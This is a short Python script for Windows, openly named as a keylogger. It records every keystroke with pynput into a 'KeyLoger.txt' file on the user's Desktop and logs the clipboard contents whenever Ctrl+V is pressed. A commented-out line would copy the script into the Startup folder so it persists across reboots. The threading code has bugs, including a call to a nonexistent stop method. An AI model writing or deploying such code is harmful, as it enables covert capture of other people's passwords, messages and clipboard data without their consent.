import time
import pyperclip
import threading
from pynput.keyboard._win32 import KeyCode
from pynput.keyboard import Listener
import os, logging,sys



username = os.getlogin()
logging_dir = f"C:/Users/{username}/Desktop"
# copyfile('test.py',f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.py')
logging.basicConfig(filename=f"{logging_dir}/KeyLoger.txt", level=logging.DEBUG, format="%(asctime)s:%(message)s")
stop=True

def key_handeler(key):
    kkey=str(key)[2:5]

    if str(key)== 'Key.ctrl_l' or str(key)=='Key.caps_lock' or str(key)=='Key.tab' or str(key)=='Key.shift'\
            or str(key)=='Key.ctrl_l' or str(key)=='Key.alt_l' or str(key)=='Key.alt_gr' or str(key)=='Key.ctrl_r' \
            or str(key) == 'Key.shift_r' or str(key) == 'Key.home' or str(key) == 'Key.page_up' \
            or str(key) == 'Key.page_down' or str(key) == 'Key.end' :
        return
    elif str(kkey) == 'x16':
        key=f"'{pyperclip.paste().strip()}'was pasted"
    elif str(key)== 'Key.up' or str(key) == 'Key.down' or str(key) == 'Key.left' or str(key) == 'Key.right':
        key=f'{str(key)[4: ]} arrow'
    logging.info(key)
    print(key)

def fun():
    global stop
   # if not stop:
    with Listener(on_press=key_handeler) as listener:
            listener.join()



th= threading.Thread(target=fun())
th.start()
stop=False
time.sleep(10)
stop=True
print("po")
th.stop()
time.sleep(20)
print("doned")
